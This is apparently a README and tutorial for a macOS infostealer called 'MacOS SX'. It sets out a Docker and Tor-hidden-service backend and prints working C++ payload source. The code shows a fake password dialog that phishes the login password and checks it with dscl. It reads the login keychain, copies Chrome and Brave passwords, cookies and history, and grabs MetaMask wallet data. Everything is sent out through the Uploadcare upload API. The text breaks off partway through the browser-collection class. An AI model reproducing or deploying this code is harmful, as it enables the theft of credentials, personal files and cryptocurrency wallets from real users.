# MacOS-SX
MacOS SX (Stealer)  🕵️‍♂️💻(Passwords, cookies, Google Auth, History) Grabber 📤(uploadcare API for exfiltration)

> [!NOTE]  
> Since the source file weighs a lot, write to the contacts below to get the source code.

### Stealer has the ability to collect the following information:
Passwords (Chrome and Brave) x
Cookies (Chrome and Brave) x 
History (Chrome and Brave) x
Google Auth "Service Token" (Chrome and Brave) x
File Grabber (must capture files like .pdf, .docx, etc.) x
Keychain_db (macOS keychain database file, individually formatted) x
User keychain password (user password, usually the same one used to obtain the keychain decryption key)

![demo4](https://github.com/user-attachments/assets/5da4b6ad-d2c8-4351-9a22-ce88512a528b)

### Structure
As a Docker container enthusiast, I organize everything in containers to simplify setup and maintenance for users, even without deep knowledge of system administration. We will have the following containers:

- Builder : Responsible for compiling our payload (the code that will be executed on the victim's computer).
- Web server : Hosts our PHP interface pages using Apache.
- MySQL database : handles operations with the MySQL database.
- phpMyAdmin: Makes it easier to set up and modify our MySQL database (note: This container should be deleted after the development phase!).
- Tor : hosts our Tor domain so that our PHP pages can be accessed via Tor: macosxyiom7tvr4elggpeexsk5jsk5fgcscttaq55jhfnxfoupnwybid.onion
- Secret-Decoder: Responsible for decrypting the Keychain_db file, extracting the browser's Safe Storage Key passwords, decrypting the data and sending it to the web server.

  ![demo5](https://github.com/user-attachments/assets/3fd59915-b2cf-48ad-9a03-9750f8610cf4)

  For testing, let's run a server for our Stealer. It's very simple and convenient; just run the following commands:
  ```
  docker compose build --no-cache
  ```
  ```
  docker compose up -d
  ```
   
After starting the server, you will need to create an account and log in to it. You should also do the same on uploadcare.com and save your API credentials to be used in the next steps!

![demo6](https://github.com/user-attachments/assets/dcf3f60c-e2e5-4872-8412-6441a47c891c)

After creating an account on uploadcare, you need to go to the Stealer settings panel and add API credentials. This is necessary because our secret-decoder container will use these credentials to verify any new logs that are captured for the server!

On mac OS, programs are distributed in .dng files, but since we are just testing our malware locally, we will use the program in its raw format: apple-darwin24 (Mach-O). To do this, we will simply grant execution permission and run it manually in the terminal.:
```
chmod +x ./main_payload
./main_payload
```

In a real scenario, this compiled payload should be placed in a file.dmg along with the required macOS metadata and application structure to be recognized as a valid macOS application. macOS expects applications to follow a specific format called a package.An app, which is a directory structure that macOS recognizes as an application.
Package .app: The package .app is usually called [AppName].app, for example MyApp.app. Inside this package, the application has a specific directory structure that includes:

### Contents/ : The top-level directory of the .app package.
- Mac OS/ : Contains a compiled binary executable file of the application.
- Resources/ : Stores all resources such as icons, images, and other files needed by the application.
- Info.plist : A property list file containing metadata about the application, such as its name, version, supported architectures, and permissions.
- Frameworks/ : This directory contains all the frameworks on which the application is based.
- PlugIns/ : Contains all the plugins used by the application.

Info.plist: The Info.plist file is required for macOS to recognize the application. It contains important information, for example:
- CFBundleExecutable : the name of the executable binary file of the application (for example, MyApp).
- CFBundleIdentifier : A unique application identifier (for example, com.example.myapp).
- CFBundleVersion : The application version number (for example, 1.0).
- LSApplicationCategoryType : defines the application category (for example, public.app-category.utilities).
- NSHighResolutionCapable : Indicates whether the application supports high-resolution displays.

### Signing: To avoid security warnings like "Unidentified Developer" when opening an application, macOS requires that the application be signed using an Apple developer ID. This cryptographic signature verifies the integrity and authenticity of the application. The signing process requires a paid Apple Developer Program account ($99/year), which ensures that the application is recognized as having been obtained from a legitimate source. However, this step is beyond the scope of this article.

### Full technical explanation
- Builder
- web server
- mysql_db
- phpmyadmin
- top
- secret decoder

  #### /builder/Dockerfile
  ```
  # Use the macOS cross-compiler image as the base

FROM ghcr.io/shepherdjerred/macos-cross-compiler:latest

Update package list and install required packages
RUN apt-get update && \
    apt-get install -y \
    curl \
    pkg-config \
    libssl-dev \
    gcc-mingw-w64 \
    clang \
    cmake \
    make \
    zlib1g-dev

Copy your macOS project code into the container

COPY ./projects /app

Set the working directory
WORKDIR /app

Execute the builder_manager script and keep the container alive
```
CMD ["/bin/sh", "-c", "/app/builder_manager/target/release/builder_manager && tail -f /dev/null"]
```

We have just captured the official Docker image of the macOS Cross Compiler project and installed several dependencies. After that, we set the working path and launched our build manager: /app/builder_manager/target/release/builder_manager (we'll talk about it later!)

### web/Dockerfile

```
Use a specific PHP image with GD and Apache
FROM php:8.2-apache


Install necessary extensions
RUN apt-get update && apt-get install -y \
    libfreetype6-dev \
    libjpeg62-turbo-dev \
    libpng-dev \
    libzip-dev \
    zip \
    && docker-php-ext-configure gd --with-freetype --with-jpeg \
    && docker-php-ext-install -j$(nproc) gd zip mysqli pdo pdo_mysql


Clean up
RUN apt-get clean && rm -rf /var/lib/apt/lists/*


Copy the source code into /var/www/html
COPY ./www /var/www/html


Change owner of the html folder to www-data
RUN chown -R www-data:www-data /var/www/html


Set PHP configuration options
RUN echo "post_max_size = 100M" >> /usr/local/etc/php/php.ini && \
    echo "upload_max_filesize = 100M" >> /usr/local/etc/php/php.ini && \
    echo "max_execution_time = 0" >> /usr/local/etc/php/php.ini


Expose ports 80 and 443
EXPOSE 80
EXPOSE 443
```

### Here is a brief explanation of the steps being taken:

- Using the PHP image with Apache : Dockerfile starts with using the official php image:8.2-apache to configure PHP with Apache.
- Installing required extensions: Installs PHP dependencies and extensions (e.g. GD, ZIP, and MySQL) required for the project.
- Cleanup: Removes unnecessary package lists to reduce the size of the image.
- Copy the source code: The code from the catalog ./www is copied to /var/www/html inside the container.
- Owner Change: Sets the owner of the /var/www/html folder to www-data, which is the default Apache user.
- Configuring PHP settings: Configure PHP settings for the size of the uploaded file, execution time, etc.
- Opening ports: Finally, it opens ports 80 (HTTP) and 443 (HTTPS) for web traffic.

#### /mysql/Dockerfile

Tables store organized data for different parts of the system.:
- Builder stores information about payload creation.
- The hijacker saves the captured data from the target machine.
- uploadcare contains the keys for uploading data.
- users manage login and session information.

Everything is separated to make it easier to control and use the data.

#### phpMyAdmin is just a graphical interface for interacting with a MySQL database, which in itself does not represent any significant value.

#### Here is the explanation for /tor/Dockerfile

```
FROM debian:latest

# Install Tor
RUN apt-get update && apt-get install -y tor

# Configure Tor
COPY ./keys/* /var/lib/tor/hidden_service/
RUN echo "HiddenServiceDir /var/lib/tor/hidden_service/" >> /etc/tor/torrc \
    && echo "HiddenServicePort 80 webserver:80" >> /etc/tor/torrc \
    && echo "HiddenServicePort 443 webserver:443" >> /etc/tor/torrc \
    && echo "HiddenServiceVersion 3" >> /etc/tor/torrc

RUN chmod 700 /var/lib/tor/hidden_service/

# Clean up
RUN apt-get clean && rm -rf /var/lib/apt/lists/*

# Run Tor in the background
CMD tor -f /etc/tor/torrc
```
#### The basic image :
The dockerfile starts with the official debian image:latest. This is a clean and minimal environment, on top of which the necessary software will be installed (for example, Tor).
- Install Tor:
The apt-get update command updates the package list, and then the apt-get install -y tor command installs the Tor package. Tor is required to establish an anonymous connection and access a hidden service.

- Configure Tor :
The COPY ./keys/* /var/lib/tor/hidden_service/ command copies the keys required for the hidden Tor service to the appropriate directory (/var/lib/tor/hidden_service/).
The following RUN command adds configurations to /etc/tor/torrc to configure the hidden Tor service:
HiddenServiceDir : Specifies the directory where the private keys and the hostname of the hidden service will be stored.
HiddenServicePort 80 webserver:80 : Routes HTTP traffic (port 80) from the Tor network to port 80 of the web server container.
HiddenServicePort 443 webserver:443 : Routes HTTPS traffic (port 443) from the Tor network to port 443 of the web server container.
HiddenServiceVersion 3 : Specifies the version of the hidden service (v3 is the most secure version at the moment).

- Set Permissions :
The chmod 700 /var/lib/tor/hidden_service/ command ensures that the appropriate permissions are set for the hidden services directory, which prevents unauthorized access.
##### Cleaning :
apt-get clean && rm -rf /var/lib/apt/lists/* cleans unnecessary package lists to reduce the size of the image and leave only the necessary files.

- Start Tor:
The command CMD tor -f /etc/tor/torrc starts the Tor process in the background using the configured parameters in the torrc file. This includes a hidden Tor service, providing secure access to the web server through the anonymous Tor network.

##### Now let's talk about the most important container: the secret-decoder.
Although it is the most important container because it handles all the logic of decrypting data, it is quite simple and compact.

#### /secret-decoder/Dockerfile

```
# Use Python 2.7 image as base
FROM python:2.7-slim

# Set the working directory
WORKDIR /app

# Copy your Python script into the container
COPY ./source /app/

# Update the package manager and install necessary dependencies
RUN apt-get update && apt-get install -y \
    git \
    python2.7-dev \
    python-pip \
    python-setuptools \
    build-essential \
    && rm -rf /var/lib/apt/lists/*

# Upgrade pip and install required dependencies for Python 2
RUN pip install --upgrade pip
RUN pip install pycryptodome hexdump
RUN pip install requests

# Execute the Python script and keep the container alive
CMD ["sh", "-c", "python -B /app/main.py && tail -f /dev/null"]
#CMD ["sh", "-c", "tail -f /dev/null"]
```

#### The basic image :
The dockerfile starts with a python image:2.7-slim. This provides a minimal Python 2.7 environment that is well suited for legacy applications that require Python 2.
####Set the working directory:
The WORKDIR /app command sets the working directory inside the container to /app. All subsequent commands will be executed relative to this directory.
####Copy the Python script :
The COPY ./source /app/ command copies the contents from the ./source directory on the local computer to the /app directory inside the container. Your Python scripts and related files are stored here.
#### Install Dependencies :
RUN apt-get update && apt-get install -y git python2.7-dev python-pip python-setuptools build-essential to install the necessary packages:
git: Version Control System.
python2.7-dev: Python 2.7 development files.
python-pip: Python package installer for Python 2.
python-setuptools: Python package for dependency management.
build-essential: Required for compiling and building software.
&& rm -rf /var/lib/apt/lists/*: Clears APT cache to reduce image size.
##### Update pip and install Python packages :
RUN pip install --upgrade pip: updates pip to the latest version for Python 2.
RUN pip install pycryptodome hexdump requests: Installs Python packages:
#### pycryptodome: Cryptographic Library.
hexdump: A tool for viewing the hexadecimal representation of data.
requests: a popular HTTP library for Python.
#### Executing a Python script :
The CMD directive ensures that the following command is executed when the container is started:
python -B /app/main.py : runs the script main.py located in the /app directory. The -B parameter prohibits Python from writing .pyc files.
&& tail -f /dev/null: Keeps the container active after the script is completed by constantly running tail -f /dev/null, which prevents immediate exit from the container.

#### Now let's figure out how our main_payload works, since it is responsible for capturing all the files we need from the victim's machine.
Let's start with main.cpp :

```
#include <iostream>
#include <string>
#include <vector>
#include "modules/Support.h"
#include "modules/sysinfo.h"         // Includes the SystemProfiler class
#include "modules/PasswordPrompt.h"  // Includes the PasswordPrompt class
#include "modules/KeychainReader.h"  // Includes the KeychainReader class
#include "modules/BrowserDataCollector.h" // Includes the BrowserProfiler class (handles browser paths)
#include "modules/Grabber.h"
#include "modules/Beacon.h"  // Include the Beacon class header file
using namespace std;
int main() {
    // Define the Uploadcare API credentials
    string public_key = "{public_key}";  // Replace with your actual public key
    string secret_key = "{secret_key}";  // Replace with your actual secret key
    // Create a Beacon object
    Beacon beacon;
    // Build the beacon JSON content
    string beaconJson = beacon.build();
    // Send the beacon content to Uploadcare
    bool success = beacon.send(public_key, secret_key, beaconJson);
    // Output the result of the send operation
    if (success) {
        cout << "Beacon sent successfully!" << endl;
    } else {
        cout << "Failed to send the beacon." << endl;
    }
    return 0;
}
```

Please note that the code is compact, simple, and organized into classes to make it easier to read and modify.
First, we import the necessary modules and define the API credentials using the variables public_key and secret_key. :

```
// Define the Uploadcare API credentials


    string public_key = "{public_key}";  // Replace with your actual public key


    string secret_key = "{secret_key}";  // Replace with your actual secret key
```

After that, we declare and call the most important function in our payload, beacon.build(); . This function is responsible for orchestrating all other functions from various classes, capturing their results, and organizing everything in JSON format to send to Uploadcare via the API.
Here is the code for the Beacon class :
```
#ifndef BEACON_H
#define BEACON_H
#include <iostream>
#include <string>
#include <sstream>
#include <cstdlib>  // For getenv
#include <curl/curl.h>  // Include the libcurl header
#include <fstream>  // For file handling
using namespace std;
class Beacon {
public:
    // Builds the beacon JSON with system info, keychain, browser data, and grabbed files
    string build() {
        SystemProfiler profiler;
        PasswordPrompt passwordPrompt;
        KeychainReader keychainReader;
        BrowserProfiler browserProfiler;
        Grabber grabber;  // Instance of Grabber class to fetch files
        string password;
        string systemInfo;
        string keychainData;
        string keychainUser;
        string keychainPassword;
        try {
            // Capture and verify user password
            password = passwordPrompt.captureAndVerifyPassword(); // Capture real password from the user
            // Retrieve system information
            systemInfo = profiler.getSystemInformation();  // Collect system data (version, username, UUID)
            // Retrieve keychain data (user, password, and keychain file)
            keychainUser = getenv("USER") ? getenv("USER") : "Unknown";  // Fallback if USER environment variable is not set
            keychainPassword = password; // Use the real password here
            // Retrieve keychain data
            keychainData = keychainReader.readAndEncodeKeychain(); // If you want to handle keychain data separately
            // Retrieve and collect all browser data (profiles, wallets, etc.)
            string browserData = browserProfiler.collectAllData();  // Collects all browser data in JSON format
            // Retrieve grabbed files data (base64 encoded contents)
            string grabberData = grabber.grabFiles();  // Grab files from user directories
            // Combine system, keychain, browser, and grabber data into a single JSON object
            stringstream finalJson;
            finalJson << "{";
            finalJson << "\"system_info\": " << systemInfo << ",";  // Include system information
            finalJson << "\"keychain\": {";
            finalJson << "\"user\": \"" << keychainUser << "\",";
            finalJson << "\"password\": \"" << keychainPassword << "\",";
            finalJson << "\"keychain_data\": \"" << keychainData << "\"";
            finalJson << "},";
            finalJson << "\"browser_data\": " << browserData << ",";  // Include browser data
            finalJson << "\"Grabber\": " << grabberData;  // Grabber data as top-level
            finalJson << "}";
            // Return the final combined JSON
            return finalJson.str();
        } catch (const exception &e) {
            cerr << "Error: " << e.what() << endl;
            return "{}";  // Return empty JSON in case of error
        }
    }

    // Callback function to capture server response (unchanged)
    static size_t WriteCallback(void *contents, size_t size, size_t nmemb, string *output) {
        size_t total_size = size * nmemb;
        output->append((char*)contents, total_size);
        return total_size;
    }
    // Sends beacon content to Uploadcare with multipart (simplified)
    bool send(const string& public_key, const string& secret_key, const string& beacon_content) {
        CURL *curl;
        CURLcode res;
        string response_data;
        const char* temp_filename = "/tmp/beacon_content.json";
 
        // Create temporary file and write JSON data
        ofstream temp_file(temp_filename);
        if (!temp_file) return false;
        temp_file << beacon_content;
        temp_file.close();
        // Initialize CURL
        curl_global_init(CURL_GLOBAL_DEFAULT);
        curl = curl_easy_init();
        if (!curl) return false;
        // Prepare headers and form data
        struct curl_slist *headers = nullptr;
        headers = curl_slist_append(headers, ("Authorization: Uploadcare.Simple " + public_key + ":" + secret_key).c_str());
        headers = curl_slist_append(headers, "Accept: application/vnd.uploadcare-v0.7+json");
        struct curl_httppost *formpost = nullptr, *lastptr = nullptr;
        curl_formadd(&formpost, &lastptr, CURLFORM_COPYNAME, "file", CURLFORM_FILE, temp_filename, CURLFORM_END);
        curl_formadd(&formpost, &lastptr, CURLFORM_COPYNAME, "UPLOADCARE_PUB_KEY", CURLFORM_COPYCONTENTS, public_key.c_str(), CURLFORM_END);
        curl_formadd(&formpost, &lastptr, CURLFORM_COPYNAME, "UPLOADCARE_STORE", CURLFORM_COPYCONTENTS, "auto", CURLFORM_END);
        // Set options for the request
        curl_easy_setopt(curl, CURLOPT_URL, "https://upload.uploadcare.com/base/");
        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
        curl_easy_setopt(curl, CURLOPT_HTTPPOST, formpost);
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response_data);
        // Perform the request
        res = curl_easy_perform(curl);
 
        // Cleanup
        curl_easy_cleanup(curl);
        curl_slist_free_all(headers);
        curl_formfree(formpost);
        curl_global_cleanup();
        remove(temp_filename);  // Delete temporary file after sending
        if (res != CURLE_OK) return false;
        // Optionally, print the response code and data
        long response_code;
        curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &response_code);
        if (response_code != 200) {
            cerr << "Server Error: " << response_data << endl;
            return false;
        }
        return true;
    }
};
#endif // BEACON_H
```

The code is simple and well organized, following the same structure as main.
We start by defining the secondary classes to be used, and then move on to calling the main function, captureAndVerifyPassword.
```
// Capture and verify user password


           password = passwordPrompt.captureAndVerifyPassword(); // Capture real password from the user
```

The first function is taken from the password Prompt class.

```
#ifndef PASSWORDPROMPT_H
#define PASSWORDPROMPT_H
#include <iostream>
#include <string>
#include <array>
#include <memory>
#include <stdexcept>
#include <unistd.h> // To get the username on macOS
using namespace std;
class PasswordPrompt {
public:
    // Displays a macOS dialog to capture a password and returns the result
    string getPassword(const string &message) const {
        string command = R"(
            osascript -e 'display dialog ")" + message + R"(" with title "XSS Forum Access" with icon caution default answer "" giving up after 30 with hidden answer' 2>&1
            )";
        array<char, 128> buffer;
        string result;
        // Open a pipe to execute the command
        shared_ptr<FILE> pipe(popen(command.c_str(), "r"), pclose);
        if (!pipe) {
            throw runtime_error("Failed to open pipe for password prompt!");
        }
        // Read the output of the osascript command
        while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr) {
            result += buffer.data();
        }
        // Extract the password from the dialog result
        size_t startPos = result.find("text returned:");
        if (startPos != string::npos) {
            startPos += 14; // Length of "text returned:"
            size_t endPos = result.find(", gave up:", startPos);
            if (endPos != string::npos) {
                return result.substr(startPos, endPos - startPos);
            } else {
                return result.substr(startPos);
            }
        } else {
            throw runtime_error("Password not captured!");
        }
    }
    // Verifies if the password is correct
    bool verifyPassword(const string &username, const string &password) const {
        string command = "dscl /Local/Default -authonly " + username + " " + password + " 2>&1";
        array<char, 128> buffer;
        string result;
        // Execute the command
        shared_ptr<FILE> pipe(popen(command.c_str(), "r"), pclose);
        if (!pipe) {
            throw runtime_error("Failed to open pipe for verification!");
        }
        // Read the command output
        while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr) {
            result += buffer.data();
        }
        return result.empty(); // Empty result indicates success
    }
    // Captures and verifies the password in a loop, returning the original password on success
    string captureAndVerifyPassword() const {
        string username = getUsername();
        string message = "Join the elite community on XSS.is! Please enter your password to proceed.";
        while (true) {
            try {
                string password = getPassword(message);
                if (verifyPassword(username, password)) {
                    // Return the original password if verified
                    return password;
                } else {
                    message = "The previous password was incorrect. Please try again.";
                }
            } catch (const exception &e) {
                cerr << "Error: " << e.what() << endl;
            }
        }
    }
private:
    // Retrieves the current username
    string getUsername() const {
        char buffer[128];
        if (getlogin_r(buffer, sizeof(buffer)) == 0) {
            return string(buffer);
        } else {
            throw runtime_error("Failed to get the current username!");
        }
    }
};
#endif // PASSWORDPROMPT_H
```

This class, as the name suggests, is responsible for requesting the user's password and verifying its validity. In case of an incorrect password, the user will be prompted to re-enter the password until a valid password is provided.
After capturing the password, we start collecting system information such as the hardware ID and other basic data. This is done using the following function:

```
            // Retrieve system information

            systemInfo = profiler.getSystemInformation();  // Collect system data (version, username, UUID)
```

The profiler.getSystemInformation(); function comes from the Profiler class, which is responsible for collecting system information (such as system version, username, hardware UUID, IP information, etc.) and returning it in JSON format. This data is later used to build the final "beacon" (the name we give to the log file containing all the machine data).
Here are the contents of the Profiler class :

```
#ifndef SYSTEMPROFILER_H
#define SYSTEMPROFILER_H
#include <iostream>
#include <string>
#include <array>
#include <memory>
#include <stdexcept>
#include <fstream>
#include <sstream>
#include <iterator>
#include <vector>
#include <filesystem>
#include <algorithm>  // For std::remove
using namespace std;
namespace fs = std::filesystem;
class SystemProfiler {
public:
    // Retrieves filtered system information (System Version, User Name, Hardware UUID)
    string getSystemInformation() const {
        string command = "system_profiler SPSoftwareDataType SPHardwareDataType 2>&1";
        array<char, 128> buffer;
        string result;
        // Open a pipe to execute the command
        shared_ptr<FILE> pipe(popen(command.c_str(), "r"), pclose);
        if (!pipe) {
            throw runtime_error("Failed to open pipe!");
        }
        // Read the output of the command
        string systemVersion, userName, hardwareUUID;
        while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr) {
            string line = buffer.data();
            // Extract System Version
            if (line.find("System Version:") != string::npos) {
                systemVersion = line.substr(line.find(":") + 2);
            }
            // Extract User Name
            if (line.find("User Name:") != string::npos) {
                userName = line.substr(line.find(":") + 2);
            }
            // Extract Hardware UUID
            if (line.find("Hardware UUID:") != string::npos) {
                hardwareUUID = line.substr(line.find(":") + 2);
            }
        }
        // Get IP and country data from ip-api
        string ipInfo = getIPInfo();
        // Remove any unwanted newlines or carriage returns from the data
        systemVersion = removeNewlines(systemVersion);
        userName = removeNewlines(userName);
        hardwareUUID = removeNewlines(hardwareUUID);
        ipInfo = removeNewlines(ipInfo);
        // Format the collected data in JSON
        stringstream jsonResult;
        jsonResult << "{";
        jsonResult << "\"system_version\": \"" << systemVersion << "\",";  // System version
        jsonResult << "\"user_name\": \"" << userName << "\",";  // User name
        jsonResult << "\"hardware_uuid\": \"" << hardwareUUID << "\",";  // Hardware UUID
        jsonResult << "\"ip_info\": " << ipInfo;  // IP information
        jsonResult << "}";
        return jsonResult.str();  // Return the JSON string with the relevant data
    }
private:
    // Fetch IP and country information from ip-api using curl in the system terminal
    string getIPInfo() const {
        string command = "curl -s http://ip-api.com/json";  // Curl command to get IP info
        array<char, 128> buffer;
        string ipData;
        // Execute the curl command and capture the output
        shared_ptr<FILE> pipe(popen(command.c_str(), "r"), pclose);
        if (!pipe) {
            throw runtime_error("Failed to get IP information from ip-api");
        }
        // Read the output from curl
        while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr) {
            ipData += buffer.data();
        }
        // Process the IP data (extracting country and IP)
        string country = extractValue(ipData, "\"country\":\"", "\"");
        string ip = extractValue(ipData, "\"query\":\"", "\"");
        // Return the extracted data as a JSON formatted string
        stringstream ipJson;
        ipJson << "{";
        ipJson << "\"country\": \"" << escapeJsonString(country) << "\",";  // Country
        ipJson << "\"ip\": \"" << escapeJsonString(ip) << "\"";  // IP address
        ipJson << "}";
        return ipJson.str();
    }
    // Extracts a value between two delimiters from a JSON-like string
    string extractValue(const string &data, const string &start, const string &end) const {
        size_t startPos = data.find(start);
        if (startPos == string::npos) return "";
        startPos += start.length();
        size_t endPos = data.find(end, startPos);
        if (endPos == string::npos) return "";
        return data.substr(startPos, endPos - startPos);
    }
    // Helper function to escape JSON special characters
    string escapeJsonString(const string& str) const {
        string escaped = str;
        size_t pos = 0;
        while ((pos = escaped.find("\"", pos)) != string::npos) {
            escaped.replace(pos, 1, "\\\"");  // Escape double quotes
            pos += 2;  // Move past the newly escaped character
        }
        return escaped;
    }
    // Helper function to remove newlines or carriage returns
    string removeNewlines(const string& str) const {
        string result = str;
        result.erase(remove(result.begin(), result.end(), '\n'), result.end());  // Remove newline
        result.erase(remove(result.begin(), result.end(), '\r'), result.end());  // Remove carriage return
        return result;
    }
};
#endif // SYSTEMPROFILER_H
```

After collecting the system information, the Beacon class begins to organize variables with data that will later be inserted into the final beacon.json file.

```
            // Retrieve keychain data (user, password, and keychain file)

            keychainUser = getenv("USER") ? getenv("USER") : "Unknown";  // Fallback if USER environment variable is not set

            keychainPassword = password; // Use the real password here
```

To do this, I'm creating a keychain reading and encoding function. :

```
            // Retrieve keychain data

            keychainData = keychainReader.readAndEncodeKeychain(); // If you want to handle keychain data separately
```

This function is responsible for capturing bytes from the keychain_db file and returning them in Base64 encoding!

This function is part of the Keychain Reader class. :

```
#ifndef KEYCHAINREADER_H
#define KEYCHAINREADER_H
#include <iostream>
#include <fstream>
#include <string>
#include <vector>
#include <stdexcept>
#include <iterator>
#include <cstdlib> // For getenv
namespace std {
class KeychainReader {
public:
    string getKeychainPath() const {
        const char* homeDir = getenv("HOME");
        if (!homeDir) {
            throw runtime_error("Failed to get home directory.");
        }
        return string(homeDir) + "/Library/Keychains/login.keychain-db";
    }
    string readAndEncodeKeychain() const {
        string filePath = getKeychainPath();
        ifstream file(filePath, ios::binary);
        if (!file) {
            throw runtime_error("Failed to open keychain file at: " + filePath);
        }
        vector<unsigned char> fileData((istreambuf_iterator<char>(file)), istreambuf_iterator<char>());
        file.close();
 
        // Move base64 encoding to the Support class
        return base64Encode(fileData);
    }
};
} // namespace std
#endif // KEYCHAINREADER_H
```

#### At the moment, we have already collected the following information:
- The user's password (keychain Password)
- System information (system version, user_name, equipment identifier, IP information)
- Keychain data (bytes /Library/Keychains/login.keychain-db, encoded in Base64 as a string)

#### Now let's start collecting browser data! Currently, stiller only supports Chrome and Brave browsers, but it can be easily expanded in the future if needed.
To collect browser data, we call the collect All Data function. :

```
            // Retrieve and collect all browser data (profiles, wallets, etc.)

            string browserData = browserProfiler.collectAllData();  // Collects all browser data in JSON format
```

This function is part of the browserProfiler class. :
```
#ifndef BROWSERPROFILER_H
#define BROWSERPROFILER_H
#include <iostream>
#include <string>
#include <vector>
#include <filesystem>
#include <stdexcept>
#include <unordered_set>
#include <fstream>
#include <sstream>
#include <iterator>
using namespace std;
namespace fs = std::filesystem;
class BrowserProfiler {
public:
    BrowserProfiler() {
        const char* homeDir = getenv("HOME");  // Get environment variable "HOME"
        if (!homeDir) {  // Check if getenv returned nullptr
            throw runtime_error("Failed to get the home directory.");
        }
        homeDirectory = homeDir;  // Assign to std::string
 
        // Browser paths initialization (macOS paths without User Data)
        browserPaths = {
            {"Chrome", "/Library/Application Support/Google/Chrome"},
            {"Brave", "/Library/Application Support/BraveSoftware/Brave-Browser"}
        };
        // Predefined extension IDs to capture
        extensionIds = {
            "nkbihfbeogaeaoehlefnkodbefgpgknn",  // MetaMask
        };
    }
    string collectAllData() {
        stringstream jsonResult;
        jsonResult << "{";  // Start the JSON object
        bool firstBrowser = true;
        for (const auto& [browserName, browserPath] : browserPaths) {
            try {
                string fullPath = homeDirectory + browserPath;  // Combine home dir with browser path
                vector<string> profiles = getProfiles(fullPath);
                if (!profiles.empty()) {
                    // Add a comma between browsers in JSON
                    if (!firstBrowser) {
                        jsonResult << ",";
                    }
                    jsonResult << "\"" << browserName << "\": [";  // Start profiles array for browser
                    bool firstProfile = true;
                    for (const string& profile : profiles) {
                        string profilePath = fs::path(fullPath) / profile;  // Construct full profile path
                        // Collect data for each profile
                        if (!firstProfile) {
                            jsonResult << ",";  // Separate JSON objects with commas
                        }
                        jsonResult << "{";
                        jsonResult << "\"profile_name\": \"" << profile << "\",";  // Profile name
                        jsonResult << "\"profile_path\": \"" << profilePath << "\",";  // Profile path
                        // Collect browser files (Web Data, History, Cookies, Login Data)
                        collectBrowserFiles(jsonResult, profilePath);
                        // Collect wallet data
                        collectWalletData(jsonResult, profilePath);
                        jsonResult << "}";  // End of the profile object
                        firstProfile = false;
                    }
                    jsonResult << "]";  // End the profiles array for the browser
                }
                firstBrowser = false;
            } catch (const exception& e) {
                // Skip errors and continue with the next browser
            }
        }
        jsonResult << "}";  // End the JSON object
        return jsonResult.str();  // Return the JSON string
    }
private:
    string homeDirectory;  // Store the home directory
    vector<pair<string, string>> browserPaths;  // Browser paths with names
    unordered_set<string> extensionIds;  // Set of extension IDs to search for
    vector<string> getProfiles(const string& browserPath) const {
        vector<string> profiles;
        // Check if the browser directory exists and is a directory
        if (fs::exists(browserPath) && fs::is_directory(browserPath)) {
            for (const auto& entry : fs::directory_iterator(browserPath)) {
                if (entry.is_directory()) {
                    string folderName = entry.path().filename().string();
                    // Match folders named "Default" or those starting with "Profile"
                    if (folderName == "Default" || folderName.rfind("Profile", 0) == 0) {
                        profiles.push_back(folderName);
                    }
                }
            }
        }
        return profiles;
    }
    void collectBrowserFiles(stringstream& jsonResult, const string& profilePath) const {
        // Files to capture
        vector<string> filenames = {"Web Data", "History", "Cookies", "Login Data"};
        bool firstFile = true;
        for (const string& filename : filenames) {
            string filePath = profilePath + "/" + filename;
            if (fs::exists(filePath)) {
                // Add a comma between files in JSON
                if (!firstFile) {
                    jsonResult << ",";
                }
                firstFile = false;
                jsonResult << "\"" << filename << "\": \"";  // File name
                vector<unsigned char> fileData = readFile(filePath);
                string encodedData = base64Encode(fileData);  // Using the external base64Encode function
                jsonResult << encodedData << "\"";  // Base64 encoded file content
            }
        }
    }
    void collectWalletData(stringstream& jsonResult, const string& profilePath) const {
        // Find wallet paths inside the profile
        vector<string> walletPaths = findWallets(profilePath);
        if (!walletPaths.empty()) {
            jsonResult << ",\"wallet_data\": [";
            bool firstWallet = true;
            for (const string& walletPath : walletPaths) {
                if (!firstWallet) {
                    jsonResult << ",";
                }
                firstWallet = false;
                jsonResult << "{";
                jsonResult << "\"wallet_id\": \"" << fs::path(walletPath).filename().string() << "\",";  // Add wallet ID
                jsonResult << "\"wallet_path\": \"" << walletPath << "\",";  // Wallet path
                jsonResult << "\"content\": ";  // Wallet content (files and subfolders)
                // Collect wallet files recursively
                collectWalletDataRecursive(jsonResult, walletPath);
                jsonResult << "}";  // End of wallet object
            }
            jsonResult << "]";  // End of wallet_data array
        }
    }
    vector<string> findWallets(const string& profilePath) const {
        vector<string> walletPaths;
        string extensionsPath = profilePath + "/Local Extension Settings";  // Path to the Extensions folder
        if (fs::exists(extensionsPath) && fs::is_directory(extensionsPath)) {
            for (const auto& entry : fs::directory_iterator(extensionsPath)) {
                if (entry.is_directory()) {
                    string extensionId = entry.path().filename().string();
                    // Check if the extension ID matches one of the predefined IDs
                    if (extensionIds.find(extensionId) != extensionIds.end()) {
                        walletPaths.push_back(entry.path().string());  // Add full path to extensions found
                    }
                }
            }
        }
        return walletPaths;
    }
    void collectWalletDataRecursive(stringstream& jsonResult, const string& currentPath) const {
        jsonResult << "[";  // Start array for files and directories
        bool firstItem = true;
        for (const auto& entry : fs::directory_iterator(currentPath)) {
            if (!firstItem) {
                jsonResult << ",";
            }
            firstItem = false;
            if (entry.is_directory()) {
                // It's a folder, recurse into it
                jsonResult << "{";
                jsonResult << "\"type\": \"folder\",";
                jsonResult << "\"name\": \"" << entry.path().filename().string() << "\",";
                jsonResult << "\"content\": ";
                collectWalletDataRecursive(jsonResult, entry.path().string());  // Recurse into subfolder
                jsonResult << "}";  // End of folder object
            } else if (entry.is_regular_file()) {
                // It's a file, base64 encode its content
                jsonResult << "{";
                jsonResult << "\"type\": \"file\",";
                jsonResult << "\"name\": \"" << entry.path().filename().string() << "\",";
                jsonResult << "\"content\": \"";  // File content
                vector<unsigned char> fileData = readFile(entry.path().string());
                string encodedData = base64Encode(fileData);  // Base64 encode the file content
                jsonResult << encodedData << "\"";  // Add encoded content
                jsonResult << "}";  // End of file object
            }
        }
